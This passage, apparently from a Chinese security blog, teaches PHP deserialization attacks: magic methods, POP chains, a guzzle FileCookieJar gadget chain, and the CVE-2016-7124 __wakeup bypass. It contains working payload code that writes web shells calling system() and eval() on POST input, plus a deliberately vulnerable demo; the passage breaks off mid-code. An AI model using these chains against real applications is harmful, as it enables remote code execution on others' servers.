class="headerlink" title="0x02 PHP（反）序列化有关的魔法函数"></a>0x02 PHP（反）序列化有关的魔法函数</h1><ul><li><p><strong>construct(), </strong>destruct()</p><p>  构造函数与析构函数</p></li><li><p><strong>call(), </strong>callStatic()</p><p>  方法重载的两个函数</p><ul><li>__call()是在对象上下文中调用不可访问的方法时触发</li><li>__callStatic()是在静态上下文中调用不可访问的方法时触发。</li></ul></li><li><p><strong>get(), </strong>set()</p><ul><li>__get()用于从不可访问的属性读取数据。</li><li>__set()用于将数据写入不可访问的属性。</li></ul></li><li><p><strong>isset(), </strong>unset()</p><ul><li>__isset()在不可访问的属性上调用isset()或empty()触发。</li><li>__unset()在不可访问的属性上使用unset()时触发。</li></ul></li><li><strong>sleep(), </strong>wakeup()<ul><li>serialize()检查您的类是否具有魔术名<strong>sleep()的函数。如果是这样，该函数在任何序列化之前执行。它可以清理对象，并且应该返回一个数组，其中应该被序列化的对象的所有变量的名称。如果该方法不返回任何内容，则将NULL序列化并发出E_NOTICE。</strong>sleep()的预期用途是提交挂起的数据或执行类似的清理任务。此外，如果您有非常大的对象，不需要完全保存，该功能将非常有用。</li><li>unserialize()使用魔术名<strong>wakeup()检查函数的存在。如果存在，该功能可以重构对象可能具有的任何资源。</strong>wakeup()的预期用途是重新建立在序列化期间可能已丢失的任何数据库连接，并执行其他重新初始化任务。  </li></ul></li><li><p>__toString()</p><ul><li>__toString（）方法允许一个类决定如何处理像一个字符串时它将如何反应。</li></ul></li><li><p>__invoke()</p><p>  当脚本尝试将对象调用为函数时，调用__invoke()方法。</p></li><li><p>__set_state()</p></li><li>__clone()</li><li>__debugInfo()</li></ul><h1 id="0x03-PHP反序列化与POP链"><a href="#0x03-PHP反序列化与POP链" class="headerlink" title="0x03 PHP反序列化与POP链"></a>0x03 PHP反序列化与POP链</h1><h2 id="1-魔术方法与POP链"><a href="#1-魔术方法与POP链" class="headerlink" title="1. 魔术方法与POP链"></a>1. 魔术方法与POP链</h2><p>就如前文所说，当反序列化参数可控时，可能会产生严重的安全威胁。<br>面向对象编程从一定程度上来说，就是完成类与类之间的调用。就像ROP一样，POP链起于一些小的“组件”，这些小“组件”可以调用其他的“组件”。在PHP中，“组件”就是这些魔术方法（<code>__wakeup()</code>或<code>__destruct</code>）。</p><p>一些对我们来说有用的POP链方法：</p><ul><li>命令执行：<ul><li>exec()</li><li>passthru()</li><li>popen()</li><li>system()</li></ul></li><li>文件操作：<ul><li>file_put_contents()</li><li>file_get_contents()</li><li>unlink()</li></ul></li></ul><h2 id="2-POP链demo"><a href="#2-POP链demo" class="headerlink" title="2. POP链demo"></a>2. POP链demo</h2><blockquote><p>popdemo.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">popdemo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data = <span class="string">"demo\n"</span>;</span><br><span class="line">    <span class="keyword">private</span> $filename = <span class="string">'./demo'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;save(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        file_put_contents($filename, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码即完成了一个简单的POP链，若传入一个构造好的序列化字符串，则会完成写文件操作。</p><blockquote><p>poc.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"./popdemo.php"</span>;</span><br><span class="line">$demo = <span class="keyword">new</span> popdemo();</span><br><span class="line">file_put_contents(<span class="string">'./pop_serialized.txt'</span>, serialize($demo));</span><br></pre></td></tr></table></figure><blockquote><p>pop_unserialize.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"./popdemo.php"</span>;</span><br><span class="line">unserialize(file_get_contents(<span class="string">'./pop_serialized.txt'</span>));</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999166628793.jpg" alt=""></p><p>表面看上去，我们完美的执行了代码的功能，那么我们改一下序列化代码，看一看效果：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999171016380.jpg" alt=""></p><p>改为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">"popdemo"</span>:<span class="number">2</span>:&#123;s:<span class="number">13</span>:<span class="string">"popdemodata"</span>;s:<span class="number">5</span>:<span class="string">"hack</span></span><br><span class="line"><span class="string">"</span>;s:<span class="number">17</span>:<span class="string">"popdemofilename"</span>;s:<span class="number">6</span>:<span class="string">"./hack"</span>;&#125;</span><br></pre></td></tr></table></figure><p>便执行了我们想要执行的效果：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999174258769.jpg" alt=""></p><h2 id="3-Autoloading与（反）序列化威胁"><a href="#3-Autoloading与（反）序列化威胁" class="headerlink" title="3. Autoloading与（反）序列化威胁"></a>3. Autoloading与（反）序列化威胁</h2><ul><li>PHP只能<code>unserialize()</code>那些定义了的类</li><li>传统的PHP要求应用程序导入每个类中的所有类文件，这样就意味着每个PHP文件需要一列长长的<code>include</code>或<code>require</code>方法，而在当前主流的PHP框架中，都采用了Autoloading自动加载类来完成这样繁重的工作。</li><li>在完善简化了类之间调用的功能的同时，也为序列化漏洞造成了便捷。</li></ul><p>举个例子：</p><p>目录结构为下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999254540532.jpg" alt=""></p><blockquote><p>index.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">autoload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load1</span><span class="params">($className)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_file($className.<span class="string">'.php'</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">require</span> $className.<span class="string">'.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load2</span><span class="params">($className)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_file(<span class="string">'./app/'</span>.$className.<span class="string">'.php'</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">require</span> <span class="string">'./app/'</span>.$className.<span class="string">'.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load3</span><span class="params">($className)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_file(<span class="string">'./lib/'</span>.$className.<span class="string">'.php'</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">require</span> <span class="string">'./lib/'</span>.$className.<span class="string">'.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">spl_autoload_register(<span class="string">'autoload::load1()'</span>);</span><br><span class="line">spl_autoload_register(<span class="string">'autoload::load2()'</span>);</span><br><span class="line">spl_autoload_register(<span class="string">'autoload::load3()'</span>);</span><br><span class="line"></span><br><span class="line">$test1 = <span class="keyword">new</span> test1();</span><br><span class="line">$test2 = <span class="keyword">new</span> test2();</span><br><span class="line">$test3 = <span class="keyword">new</span> test3();</span><br></pre></td></tr></table></figure><blockquote><p>test1.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test1_data = <span class="string">'test1_data'</span>;</span><br><span class="line">    <span class="keyword">private</span> $test1_filename = <span class="string">'./test1_demo.txt'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;save(<span class="keyword">$this</span>-&gt;test1_filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($test1_filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        file_put_contents($test1_filename, <span class="keyword">$this</span>-&gt;test1_data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其余的<code>test2</code>和<code>test3</code>和<code>test1</code>的内容类似。</p><p>运行一下<code>index.php</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999262214593.jpg" alt=""></p><p>可以看到已经自动加载类会自动寻找已经注册在其队列中的类，并在其被实例化的时候，执行相关的操作。</p><p>若想了解更多关于自动加载类的资料，请查阅<a href="http://lucifaer.com/index.php/archives/17/">spl_autoload_register</a></p><h2 id="4-Composer与Autoloading"><a href="#4-Composer与Autoloading" class="headerlink" title="4. Composer与Autoloading"></a>4. Composer与Autoloading</h2><p>说到了Autoloader自动加载类，就不得不说一下Composer这个东西了。Composer是PHP用来管理依赖（dependency）关系的工具。你可以在自己的项目中声明所依赖的外部工具库（libraries），Composer 会帮你安装这些依赖的库文件。</p><p>经常搭建框架环境的同学应该对这个非常熟悉了，无论是搭建一个新的Laravel还是一个新的Symfony，安装步骤中总有一步是通过Composer来进行安装。</p><p>比如在安装Laravel的时候，执行<code>composer global require &quot;laravel/installer&quot;</code>就可以搭建成以下目录结构的环境：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999270597374.jpg" alt=""></p><p>其中已经将环境所需的依赖库文件配置完毕，正是因为Composer与Autuoloading的有效结合，才构成了完整的POP数据流。</p><h1 id="0x04-反序列化漏洞的挖掘"><a href="#0x04-反序列化漏洞的挖掘" class="headerlink" title="0x04 反序列化漏洞的挖掘"></a>0x04 反序列化漏洞的挖掘</h1><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>通过上面对Composer的介绍，我们可以看出，Composer所拉取的依赖库文件是一个框架的基础。</p><p>而Composer默认是从Packagist来下载依赖库的。</p><p>所以我们挖掘漏洞的思路就可以从依赖库文件入手。</p><p>目前总结出来两种大的趋势，还有一种猜想：</p><ol><li>从可能存在漏洞的依赖库文件入手</li><li>从应用的代码框架的逻辑上入手</li><li>从PHP语言本身漏洞入手</li></ol><p>接下来逐个的介绍一下。</p><h2 id="2-依赖库"><a href="#2-依赖库" class="headerlink" title="2. 依赖库"></a>2. 依赖库</h2><p>以下这些依赖库，准确来说并不能说是依赖库的问题，只能说这些依赖库存在我们想要的文件读写或者代码执行的功能。而引用这些依赖库的应用在引用时并没有完善的过滤，从而产生漏洞。</p><ul><li>cartalyst/sentry</li><li>cartalyst/sentinel</li></ul><p>寻找依赖库漏洞的方法，可以说是简单粗暴：</p><ul><li>首先在依赖库中使用<code>RIPS</code>或<code>grep</code>全局搜索<code>__wakeup()</code>和<code>__destruct()</code></li><li>从最流行的库开始，跟进每个类，查看是否存在我们可以利用的组件（可被漏洞利用的操作）</li><li>手动验证，并构建POP链</li><li>利用易受攻击的方式部署应用程序和POP组件，通过自动加载类来生成poc及测试漏洞。</li></ul><p>以下为一些存在可利用组件的依赖库：</p><ul><li>任意写<ul><li>monolog/monolog(&lt;1.11.0)</li><li>guzzlehttp/guzzle</li><li>guzzle/guzzle</li></ul></li><li>任意删除<ul><li>swiftmailer/swiftmailer</li></ul></li><li>拒绝式服务(proc_terminate())<ul><li>symfony/process</li></ul></li></ul><p>下面来举一个老外已经说过的经典例子，来具体的说一下过程。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="1-寻找可能存在漏洞的应用"><a href="#1-寻找可能存在漏洞的应用" class="headerlink" title="1. 寻找可能存在漏洞的应用"></a>1. 寻找可能存在漏洞的应用</h4><p>存在漏洞的应用：cartalyst/sentry</p><p>漏洞存在于：/src/Cartalyst/Sentry/Cookies/NativeCookie.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">     ...</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCookie</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">     ...</span><br><span class="line">     <span class="keyword">return</span> unserialize($_COOKIE[<span class="keyword">$this</span>-&gt;getKey()]);</span><br><span class="line">     ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>应用使用的库中的可利用的POP组件：guzzlehttp/guzzle</p><p>寻找POP组件的最好方式，就是直接看<code>composer.json</code>文件，该文件中写明了应用需要使用的库。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> &#123;</span><br><span class="line">    <span class="string">"require"</span>: &#123;</span><br><span class="line">    <span class="string">"cartalyst/sentry"</span>: <span class="string">"2.1.5"</span>,</span><br><span class="line">    <span class="string">"illuminate/database"</span>: <span class="string">"4.0.*"</span>,</span><br><span class="line">    <span class="string">"guzzlehttp/guzzle"</span>: <span class="string">"6.0.2"</span>,</span><br><span class="line">    <span class="string">"swiftmailer/swiftmailer"</span>: <span class="string">"5.4.1"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-寻找可以利用的POP组件"><a href="#2-寻找可以利用的POP组件" class="headerlink" title="2. 寻找可以利用的POP组件"></a>2. 寻找可以利用的POP组件</h4><p>我们下载guzzlehttp/guzzle这个依赖库，并使用grep来搜索一下<code>__destruct()</code>和<code>__wakeup()</code></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999994724838.jpg" alt=""></p><p>逐个看一下，在/guzzle/src/Cookie/FileCookieJar.php发现可利用的POP组件：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999995535422.jpg" alt=""></p><p>跟进看一下save方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999996019593.jpg" alt=""></p><p>存在一下代码，造成任意文件写操作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">false</span> === file_put_contents($filename, $jsonStr))</span><br></pre></td></tr></table></figure><p>注意到现在<code>$filename</code>可控，也就是文件名可控。同时看到<code>$jsonStr</code>为上层循环来得到的数组经过json编码后得到的，且数组内容为<code>$cookie-&gt;toArray()</code>，也就是说如果我们可控<code>$cookie-&gt;toArray()</code>的值，我们就能控制文件内容。</p><p>如何找到<code>$cookie</code>呢？注意到前面</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000019016695.jpg" alt=""></p><p>跟进父类，看到父类implements了CookieJarInterface</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000019757754.jpg" alt=""></p><p>还有其中的toArray方法</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000020174432.jpg" alt=""></p><p>很明显调用了其中的SetCookie的接口：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000021165941.jpg" alt=""></p><p>看一下目录结构：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000021860870.jpg" alt=""></p><p>所以定位到SetCookie.php：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000022331337.jpg" alt=""></p><p>可以看到，这里只是简单的返回了data数组的特定键值。</p><h4 id="3-手动验证，并构建POP链"><a href="#3-手动验证，并构建POP链" class="headerlink" title="3. 手动验证，并构建POP链"></a>3. 手动验证，并构建POP链</h4><p>首先我们先在vm中写一个composer.json文件：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"require"</span>: &#123;</span><br><span class="line">        <span class="attr">"guzzlehttp/guzzle"</span>: <span class="string">"6.0.2"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来安装Composer：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sS https://getcomposer.org/installer | php</span><br></pre></td></tr></table></figure><p>然后根据composer.json来安装依赖库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php composer.phar install</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000052755445.jpg" alt=""></p><p>接下来，我们根据上面的分析，来构造payload：</p><blockquote><p>payload.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Cookie</span>\<span class="title">FileCookieJar</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Cookie</span>\<span class="title">SetCookie</span>;</span><br><span class="line"></span><br><span class="line">        $obj = <span class="keyword">new</span> FileCookieJar(<span class="string">'./shell.php'</span>);</span><br><span class="line"></span><br><span class="line">        $payload = <span class="string">'&lt;?php echo system($_POST[\'poc\']);?&gt;'</span>;</span><br><span class="line">        $obj-&gt;setCookie(<span class="keyword">new</span> SetCookie([</span><br><span class="line">                <span class="string">'Name'</span> =&gt; <span class="string">'lucifaer'</span>,</span><br><span class="line">                <span class="string">'Value'</span> =&gt; <span class="string">'test_poc'</span>,</span><br><span class="line">                <span class="string">'Domain'</span> =&gt; $paylaod,</span><br><span class="line">                <span class="string">'Expires'</span> =&gt; time()</span><br><span class="line">        ]));</span><br><span class="line"></span><br><span class="line">        file_put_contents(<span class="string">'./build_poc'</span>, serialize($obj));</span><br></pre></td></tr></table></figure><p>我们执行完该脚本，看一下生成的脚本的内容：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000080660821.jpg" alt=""></p><p>我们再写一个反序列化的demo脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line">    unserialize(file_get_contents(<span class="string">"./build_poc"</span>));</span><br></pre></td></tr></table></figure><p>运行后，完成任意文件写操作。至此，我们可以利用生成的序列化攻击向量来进行测试。</p><h2 id="3-PHP语言本身漏洞"><a href="#3-PHP语言本身漏洞" class="headerlink" title="3. PHP语言本身漏洞"></a>3. PHP语言本身漏洞</h2><p>提到这一点就不得不说去年的<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7124" target="_blank" rel="noopener">CVE-2016-7124</a>，同时具有代表性的漏洞即为<a href="http://bobao.360.cn/learning/detail/3020.html" target="_blank" rel="noopener">SugarCRM v6.5.23 PHP反序列化对象注入</a>。</p><p>在这里我们就不多赘述SugarCRM的这个漏洞，我们来聊一聊<code>CVE-2016-7124</code>这个漏洞。</p><p>触发该漏洞的PHP版本为PHP5小于5.6.25或PHP7小于7.0.10。</p><p>漏洞可以简要的概括为：当序列化字符串中表示对象个数的值大于真实的属性个数时会跳过<code>__wakeup()</code>的执行。</p><p>我们用一个demo来解释一下。</p><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">private</span> $poc = <span class="string">''</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($poc)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;poc = $poc;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;poc != <span class="string">''</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           file_put_contents(<span class="string">'shell.php'</span>, <span class="string">'&lt;?php eval($_POST[\'shell\']);?&gt;'</span>);</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">'Success!!!'</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">'fail to getshell!!!'</span>);</span><br><span class="line">       &#125;        </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"waking up...\n"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">$poc = $_GET[<span class="string">'poc'</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($poc))</span><br><span class="line">&#123;</span><br><span class="line">   show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">   <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$a = unserialize($poc);</span><br></pre></td></tr></table></figure><p>代码很简单，但是关键就是需要再反序列化的时候绕过<code>__wakeup</code>以达到写文件的操作。</p><p>根据cve-2016-7124我们可以构造一下我们的poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $poc = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($poc)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;poc = $poc;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;poc != <span class="string">''</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                file_put_contents(<span class="string">'shell.php'</span>, <span class="string">'&lt;?php eval($_POST[\'shell\']);?&gt;'</span>);</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'Success!!!'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'fail to getshell!!!'</span>);</span><br><span class="line">            &#125;        </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"waking up...\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    